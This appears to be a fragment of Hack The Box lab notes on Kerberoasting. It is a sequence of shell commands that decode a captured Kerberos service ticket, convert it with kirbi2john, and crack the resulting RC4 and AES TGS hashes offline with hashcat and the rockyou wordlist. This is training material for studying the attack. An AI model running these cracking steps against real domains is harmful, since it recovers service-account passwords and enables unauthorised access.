...
```shell-session
swmpdnky@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
...
```shell-session
swmpdnky@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```
...
```shell-session
swmpdnky@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```
...
```shell-session
swmpdnky@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
...
```shell-session
swmpdnky@htb[/htb]$ cat sqldev_tgs_hashcat 
...
```shell-session
swmpdnky@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
...
```shell-session
swmpdnky@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
...
![image](../imgs/aes_kerberoast.webp)
...
```shell-session
swmpdnky@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
...
![image](../imgs/kerb_encrypt_types.webp)
